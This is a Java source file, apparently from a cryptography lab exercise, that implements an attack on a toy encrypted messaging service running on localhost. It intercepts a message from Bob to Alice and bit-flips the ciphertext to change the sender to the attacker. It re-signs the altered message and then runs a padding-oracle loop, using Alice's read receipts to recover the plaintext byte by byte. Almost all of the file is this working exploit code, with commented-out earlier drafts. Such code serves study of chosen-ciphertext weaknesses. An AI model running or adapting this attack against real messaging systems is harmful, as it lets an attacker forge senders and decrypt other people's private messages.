package guang.client;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SignatureException;
import java.security.spec.InvalidKeySpecException;
import java.util.Base64;
import java.util.Map;

import com.google.gson.Gson;
public class MyGotAliceMessageNew extends Thread{
	private boolean isStopped=false;
	private String server="http://localhost:80";
	//private String newSender="guang";
	private String getMessageReciverUser="alice";
	//private String AttackerReciverUser="guang";
	private byte[] buffer=new byte[1024];  //it contains all the decrypted byte data in reverse sequnece,倒序存储所有的byte数据，然后逆向生成字符串即可完成破解
	private int bufferCount=0;
	private String attackerSender="cgy";
	private String getMessageSender="bob";
	private int getTimes=10;
	private boolean enterPaddingLength=false;
	private Map<String,String> RSAKeys;
	private Map<String,String> DSAKeys;
	@Override
	/*
	 * Generate request to server, get the message that Bob sent to Alice, and call the function messageHandler to deal with the message
	 * 
	 */
	public void run() {
		// TODO Auto-generated method stub
		AllReceiveMessage messages=null;
		ClientNet clientNet=new ClientNet(ClientNet.GET_MESSAGE, getMessageReciverUser, server);
		while(!isStopped && getTimes>0)
		{
			getTimes--;
			messages=clientNet.getMessage();
			if(messages!=null && messages.getNumMessages()>0)
			{
				for(MessageForReceive message:messages.getMessages())
				{		
					System.out.println("firstStep Message:");
					System.out.println(message.getMessage());
					try {
						Thread.sleep(5000);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					messageHandler(message);
					System.out.println("A loop has done一轮循环已经做完！！！！！");
					//打印获取的数据
					byte[] temp=new byte[bufferCount-4];
					for(int i=0;i<bufferCount-4;i++)
						temp[i]=buffer[bufferCount-i-1];
					try {
						System.out.println("The intercepted ciphertext is: 截获的密文的部分信息如下："+new String(temp,"utf-8"));
					} catch (UnsupportedEncodingException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					
					//return;
				}
				
				try {
					Thread.sleep(20000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				isStopped=true;
				break;
			}
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	public void stopThread()
	{
		this.isStopped=true;
	}
	public void setGetMessageTimes(int times)
	{
		this.getTimes=times;
	}
	/*
	 * When generate a template, it generates attackers DSA&RSA public&private keys and register attacker's publuc key
	 */
	public MyGotAliceMessageNew()
	{
		try {
			RSAKeys=RsaCrypt.createRsaKeys();
			DSAKeys=DsaCrypt.createDsaKeys();
		} catch (NoSuchAlgorithmException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		//注册cgy的公钥
		sendPublicKeys(attackerSender,server);//user server
	}
	public static void main(String args[])
	{
		MyGotAliceMessageNew mgAliceMessage=new MyGotAliceMessageNew();
		mgAliceMessage.setGetMessageTimes(100000);		
		//bob:Hey alice, w
		mgAliceMessage.start();
		MyReturnMessageHandler myReturnMessageHandler=mgAliceMessage.new MyReturnMessageHandler();
		myReturnMessageHandler.start();
	}
	/*
	 * When the message is intercepted, handle the message and it contains
	 */
	public void messageHandler(MessageForReceive message)
	{
		String messageInfos[]=null;
		if((messageInfos=message.getMessage().split(" ")).length!=3)
			return;
		else
		{
			//获取第二部分
			System.out.println(messageInfos[2]);
			byte[] messageContent=Base64.getDecoder().decode(messageInfos[1]);
			for(byte b:messageContent)
				System.out.print(String.format("%02x ", b));
			System.out.println();
			byte[] temp=new byte[16];
			System.arraycopy(messageContent, 16, temp, 0, 16); 
			byte[] attack1=null;
			byte[] attack2=null;
			String changedMessage=null;
			String c2=null;
			try {
				//step2
				attack1=(getMessageSender).getBytes("utf-8");//bob
				attack2=(attackerSender).getBytes("utf-8");//cgy
				for(int i=0;i<getMessageSender.length();i++)
				{
					temp[i]=(byte) (temp[i]^attack1[i]);
					messageContent[i+16]=(byte) (temp[i]^attack2[i]);
				}
				c2=Base64.getEncoder().encodeToString(messageContent);
				System.out.println("c2 first value: /第一次的c2/="+c2);
				//changedMessage=messageInfos[0]+" "+c2+" "+messageInfos[2];
				System.out.println(changedMessage);
				
				
			} catch (UnsupportedEncodingException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				return;
			}
			//生成新的签名
			String sign=null;
			try {
				sign = DsaCrypt.dsaSign(messageInfos[0]+" "+c2, DSAKeys.get(DsaCrypt.PRIVATE_KEY_DSA));
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} 
			changedMessage=messageInfos[0]+" "+c2+" "+sign;
			//转发消息
			ClientNet clientNet1=new ClientNet(ClientNet.POST_MESSAGE, attackerSender, server);
			MessageForSend message1=new MessageForSend();
			message1.setMessageID(message.getMessageID()+256);
			message1.setMessage(changedMessage);
			message1.setRecipient(getMessageReciverUser);
			
			System.out.println("stepTwo Message:");
			System.out.println(message1.toString());
			try {
				Thread.sleep(5000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			clientNet1.sendData(message1);
			
			//获取消息，我们必须让客户端给我们判断消息是如何的，如果是合法的，我们就可以获取到对方的回执
			//如果length未知，也可以猜测 通过测试256种情况，去了解padding的长度
			int length=87+16,allLength=0;
			byte paddingLength = (byte) (16-(length+4)%16);
			if(paddingLength!=0)
				allLength=16*((length+4)/16+1);
			else
				allLength=length+4+16;
			System.out.println("allLength="+allLength);
			
			System.out.println("messageContent.length="+messageContent.length);
			//int curruntPaddingLength=paddingLength;
			//allLength-16 表示减去了16字节的iv
			for(int curruntPaddingLength=paddingLength;curruntPaddingLength<allLength-16-4;curruntPaddingLength++)
			{
				
				//确定要修改的起点
				int startIndex=allLength-curruntPaddingLength-1;
				//将后续的点都异或明文，明文分为两部分，第一部分是最初的那个paddingLength
				//第二部分为我们已经测试出来的明文，存放在buffer空间中，先测试出来出来的先放在buffer中
				//当curruntPaddingLength大于16以后，我们需要对丢弃后面的分组，后面的分组不能作为padding的部分
				if(curruntPaddingLength>=16)
				{
					/*
					int numOfDiscardBlock=curruntPaddingLength/16;
					int truePaddingLength=0;
					if(curruntPaddingLength%16!=0)
					{
						truePaddingLength = curruntPaddingLength%16;
						int discardLength=(curruntPaddingLength/16)*16;
						byte[] messageContentTemp=new byte[messageContent.length-discardLength];
						System.arraycopy(messageContent, 0, messageContentTemp, 0, messageContent.length-discardLength);
						byte temp2=0;
						int bufferStartIndex=discardLength-paddingLength;
						int curruntCipherLength=messageContentTemp.length;
						for(int i=0;i<truePaddingLength;i++)
						{
							temp2=messageContentTemp[curruntCipherLength-i-1];
							System.out.println(String.format("%02x", buffer[i]));
							temp2=(byte) (temp2^(buffer[i+bufferStartIndex]));
							messageContentTemp[curruntCipherLength-i-1]=(byte) (temp2^(byte)(truePaddingLength+1));
						}
						temp2=messageContentTemp[startIndex];
						messageContentTemp[startIndex]=(byte) (temp2^(byte)(truePaddingLength+1));
						sendGuessInfoToUser(messageContentTemp,startIndex,messageInfos);
					}
					else
					{
						//enterPaddingLength=true;
						//truePaddingLength = 16;
						//当truePaddingLength为16的倍数时，我们需要将要修改倒数第16*k+1的位置
						//这里的发送的信息需要
						//在这种情况下会有两个结果，导致paddingLength=3的时候或者paddingLength=2的时候出现错误，我们必须要判断这个情况
						byte[] messageContentTemp=new byte[messageContent.length-curruntPaddingLength];
						System.arraycopy(messageContent, 0, messageContentTemp, 0, messageContent.length-curruntPaddingLength);
						byte temp2=0;
						temp2=messageContentTemp[startIndex];
						messageContentTemp[startIndex]=(byte) (temp2^(byte)(1));
						sendGuessInfoToUser(messageContentTemp,startIndex,messageInfos);
						
					}
					//确定需要异或的明文数量的数量
					
					 */
				}else{
					//当curruntPaddingLength小于16时，不需要丢弃分组
					//第一步异或最初的padding
					
					byte temp2=0;
					byte[] messageContentTemp=new byte[messageContent.length];
					System.arraycopy(messageContent, 0, messageContentTemp, 0, messageContent.length);
					
					for(byte i=0;i<paddingLength;i++)   //xor 0n
					{						
						temp2=messageContentTemp[allLength-i-1];
						temp2=(byte) (temp2^(paddingLength));
						messageContentTemp[allLength-i-1]=(byte) (temp2^(byte)(curruntPaddingLength+1));
										
					}
					//printByteArray(messageContentTemp);
					//huanyuan第二步异或已经测试出来的明文（在buffer中存储着）
					for(byte i=0;i<bufferCount;i++)
					{
						temp2=messageContentTemp[allLength-i-paddingLength-1];
						//System.out.println(String.format("%02x", buffer[i]));
						temp2=(byte) (temp2^(buffer[i]));
						messageContentTemp[allLength-i-paddingLength-1]=(byte) (temp2^(byte)(curruntPaddingLength+1));
					}
					//printByteArray(messageContentTemp);
					
					temp2=messageContentTemp[startIndex];
					messageContentTemp[startIndex]=(byte) (temp2^(byte)(curruntPaddingLength+1));
					//第三步修改startIndex
					sendGuessInfoToUser(messageContentTemp,startIndex,messageInfos);				
					//等待服务器反应
					try {
						Thread.sleep(10000);
						//enterPaddingLength=false;
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}					
					System.out.println("已经测试完倒数一个byte，进入下一个byte");
					
					for(int i=0;i<bufferCount;i++)
						System.out.print(String.format("%02x ", buffer[i]));
					
					System.out.println();
				}
				
			}
			
			
			
			
		}
	}
	public static void printByteArray(byte[] bytes)
	{
		for(byte b:bytes)
			System.out.print(String.format("%02x ", b));
		System.out.println();
	}
	private boolean sendPublicKeys(String user,String server)
	{
		boolean b=true;
		StringBuilder sb=new StringBuilder();
		sb.append(RSAKeys.get(RsaCrypt.PUBLIC_RSA_KEY));
		sb.append("%");
		sb.append(DSAKeys.get(DsaCrypt.PUBLIC_KEY_DSA));
		Gson gson=new Gson();
		SendPublicKey sendKey=new SendPublicKey();
		sendKey.setKeyData(sb.toString());
		//gson.toJson(sendKey);
		
		
		ClientNet net=new ClientNet(ClientNet.POST_PUBLIC_KEY, user, server);
		b=net.sendData(gson.toJson(sendKey));
		return b;
	}
	private void sendGuessInfoToUser(byte[] messageContentTemp,int startIndex,String[] messageInfos)
	{
		byte x=0;
		byte temp2=0;
		for(x=1;;x++)
		{	
			
			temp2=messageContentTemp[startIndex];
			temp2=(byte) (temp2^(byte)(x-1));// 还原出最初值
			messageContentTemp[startIndex]=(byte) (temp2^x);
			
			//printByteArray(messageContentTemp);
			String changedMessageForStep3=null;
			String c2ForStep3=null;
			//生成新的签名
			String signForStep3=null;
			try {
				c2ForStep3=Base64.getEncoder().encodeToString(messageContentTemp);
				//System.out.println("修改后的c2="+c2ForStep3);
				signForStep3 = DsaCrypt.dsaSign(messageInfos[0]+" "+c2ForStep3, DSAKeys.get(DsaCrypt.PRIVATE_KEY_DSA));
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} 
			changedMessageForStep3=messageInfos[0]+" "+c2ForStep3+" "+signForStep3;
			//转发消息
			ClientNet clientNet2=new ClientNet(ClientNet.POST_MESSAGE, attackerSender, server);
			MessageForSend messageForStep3=new MessageForSend();
			messageForStep3.setMessageID(x);
			messageForStep3.setMessage(changedMessageForStep3);
			messageForStep3.setRecipient(getMessageReciverUser);
			clientNet2.sendData(messageForStep3);
			try {
				Thread.sleep(80);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			if(x==0)
				break;
		}
	}
	public class MyReturnMessageHandler extends Thread{
		//private boolean isClose=false;
		public void run() {
			// TODO Auto-generated method stub
			ClientNet clientNet=new ClientNet(ClientNet.GET_MESSAGE, attackerSender, server);
			while(!isStopped)
			{
				int countOfThisTurn=0;
				AllReceiveMessage messages=clientNet.getMessage();
				if(messages!=null && messages.getNumMessages()>0)
				{
					for(MessageForReceive message:messages.getMessages())
					{				
						System.out.println(message.getMessage());
						ClientNet netForPublic=new ClientNet(ClientNet.GET_PUBLIC_KEY, message.getSenderID(), server);
						Map<String,String> keys=netForPublic.getPublicKeys();
						String MessageContent=Console.decryptMessageContent(message.getMessage(), keys.get(ClientNet.PUBLIC_KEY_DSA), RSAKeys.get(RsaCrypt.PRIVATE_RSA_KEY));
						
						if(MessageContent!=null)
						{
							String[] messageInfos=MessageContent.split(":");
							System.out.println(MessageContent);
							
							if(messageInfos[1].startsWith(">>>READMESSAGE"))
							{
								String[] reciverContents=null;
								if((reciverContents=messageInfos[1].split(" ")).length>=2)
								{
									System.out.println(reciverContents[1]);
									int returnByte=0;
									if((returnByte=Integer.parseInt(reciverContents[1]))<256)
									{										
											buffer[bufferCount++]=(byte)returnByte;
											System.out.println("接收到一个byte:"+(byte)returnByte);										
										
									}else
									{
										System.out.println("接收到的消息不属于Step3");
									}
								}
							}
						}
					}
					
				}
				
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
				
			}
			
		}
	}

}

/*
//这里是第一轮的代码 
 
byte[] messageContentTemp=new byte[messageContent.length];
System.arraycopy(messageContent, 0, messageContentTemp, 0, messageContent.length);
for(byte i=0;i<paddingLength;i++)
{
	
	temp2=messageContentTemp[allLength-i-1];
	temp2=(byte) (temp2^(paddingLength));
	messageContentTemp[allLength-i-1]=(byte) (temp2^(byte)(paddingLength+1));
					
}

temp2=messageContentTemp[allLength-paddingLength-1];
messageContentTemp[allLength-paddingLength-1]=(byte) (temp2^(byte)(paddingLength+1));

for(byte x=1;x<256;x++)
{				
	temp2=messageContentTemp[allLength-paddingLength-1];
	temp2=(byte) (temp2^(byte)(x-1));
	messageContentTemp[allLength-paddingLength-1]=(byte) (temp2^x);
	
	String changedMessageForStep3=null;
	String c2ForStep3=null;
	//生成新的签名
	String signForStep3=null;
	try {
		c2ForStep3=Base64.getEncoder().encodeToString(messageContentTemp);
		System.out.println("修改后的c2="+c2ForStep3);
		signForStep3 = DsaCrypt.dsaSign(messageInfos[0]+" "+c2ForStep3, DSAKeys.get(DsaCrypt.PRIVATE_KEY_DSA));
	} catch (Exception e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	} 
	changedMessageForStep3=messageInfos[0]+" "+c2ForStep3+" "+signForStep3;
	//转发消息
	ClientNet clientNet2=new ClientNet(ClientNet.POST_MESSAGE, attackerSender, server);
	MessageForSend messageForStep3=new MessageForSend();
	messageForStep3.setMessageID(x);
	messageForStep3.setMessage(changedMessageForStep3);
	messageForStep3.setRecipient(getMessageReciverUser);
	clientNet2.sendData(messageForStep3);
	try {
		Thread.sleep(1000);
	} catch (InterruptedException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}
}
*/

/*
//第三步修改startIndex

byte x=0;

for(x=1;;x++)
{	
	
	temp2=messageContentTemp[startIndex];
	temp2=(byte) (temp2^(byte)(x-1));
	messageContentTemp[startIndex]=(byte) (temp2^x);
	
	printByteArray(messageContentTemp);
	String changedMessageForStep3=null;
	String c2ForStep3=null;
	//生成新的签名
	String signForStep3=null;
	try {
		c2ForStep3=Base64.getEncoder().encodeToString(messageContentTemp);
		//System.out.println("修改后的c2="+c2ForStep3);
		signForStep3 = DsaCrypt.dsaSign(messageInfos[0]+" "+c2ForStep3, DSAKeys.get(DsaCrypt.PRIVATE_KEY_DSA));
	} catch (Exception e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	} 
	changedMessageForStep3=messageInfos[0]+" "+c2ForStep3+" "+signForStep3;
	//转发消息
	ClientNet clientNet2=new ClientNet(ClientNet.POST_MESSAGE, attackerSender, server);
	MessageForSend messageForStep3=new MessageForSend();
	messageForStep3.setMessageID(x);
	messageForStep3.setMessage(changedMessageForStep3);
	messageForStep3.setRecipient(getMessageReciverUser);
	clientNet2.sendData(messageForStep3);
	try {
		Thread.sleep(100);
	} catch (InterruptedException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}
	if(x==0)
		break;
}
*/


/*
class MyReturnMessageHandler extends Thread
{
	private String getMessageReciverUser=null;
	private String server=null;
	private Map<String,String> RSAKeys;
	private Map<String,String> DSAKeys;
	private byte[] buffer=new byte[1024];  //倒序存储所有的byte数据，然后逆向生成字符串即可完成破解
	private int bufferCount=0;
	private boolean isClose=false;
	public MyReturnMessageHandler(String getMessageReciverUser,
			String server, Map<String,String> RSAKeys, Map<String,String> DSAKeys)
	{
		this.getMessageReciverUser=getMessageReciverUser;
		this.server=server;
		this.RSAKeys=RSAKeys;
		this.DSAKeys=DSAKeys;
	}
	
	@Override
	public void run() {
		// TODO Auto-generated method stub
		ClientNet clientNet=new ClientNet(ClientNet.GET_MESSAGE, getMessageReciverUser, server);
		while(!isClose)
		{
			AllReceiveMessage messages=clientNet.getMessage();
			if(messages!=null && messages.getNumMessages()>0)
			{
				for(MessageForReceive message:messages.getMessages())
				{				
					System.out.println(message.getMessage());
					ClientNet netForPublic=new ClientNet(ClientNet.GET_PUBLIC_KEY, message.getSenderID(), server);
					Map<String,String> keys=netForPublic.getPublicKeys();
					String MessageContent=Console.decryptMessageContent(message.getMessage(), keys.get(ClientNet.PUBLIC_KEY_DSA), this.RSAKeys.get(RsaCrypt.PRIVATE_RSA_KEY));
					String[] messageInfos=MessageContent.split(":");
					if(messageInfos[1].startsWith(">>>READMESSAGE"))
					{
						String[] reciverContents=null;
						if((reciverContents=messageInfos[1].split(" ")).length>=2)
						{
							System.out.println(reciverContents[1]);
							buffer[bufferCount++]=Byte.parseByte(reciverContents[1]);
						}
					}
				}
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
			
			
		}
		
	}
	//获取消息，我们必须让客户端给我们判断消息是如何的，如果是合法的，我们就可以获取到对方的回执
	//如果length未知，也可以猜测 通过测试256种情况，去了解padding的长度
	private char[] getAllMessagePlainText(int length,MessageForReceive message)
	{
		String messageInfos[]=null;
		if((messageInfos=message.getMessage().split(" ")).length!=3)
			return null;
		else
		{
			//获取第二部分
			//System.out.println(messageInfos[2]);
			byte[] messageContent=Base64.getDecoder().decode(messageInfos[1]);
			byte paddingLength = (byte) (16-(length+4)%16);
			byte temp=0;
			for(byte x=0;x<256;x++)
			{
				temp=messageContent[length-paddingLength-1];
				temp=(byte) (temp^x);
				temp=(byte) (temp^(paddingLength+1));
				messageContent[length-paddingLength-1]=(byte) (temp^x);
				for(byte i=0;i<paddingLength;i++)
				{
					temp=messageContent[length-paddingLength];
					temp=(byte) (temp^(paddingLength));
					messageContent[length-paddingLength]=(byte) (temp^(paddingLength+1));
				}
				String changedMessage=null;
				String c2=null;
				//生成新的签名
				String sign=null;
				try {
					sign = DsaCrypt.dsaSign(messageInfos[0]+" "+c2, DSAKeys.get(DsaCrypt.PRIVATE_KEY_DSA));
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} 
				changedMessage=messageInfos[0]+" "+c2+" "+sign;
				//转发消息
				ClientNet clientNet1=new ClientNet(ClientNet.POST_MESSAGE, attackerSender, server);
				MessageForSend message1=new MessageForSend();
				message1.setMessageID(x);
				message1.setMessage(changedMessage);
				message1.setRecipient(getMessageReciverUser);
				clientNet1.sendData(message1);	
			}
			
		}
		return null;
	}
	
}
*/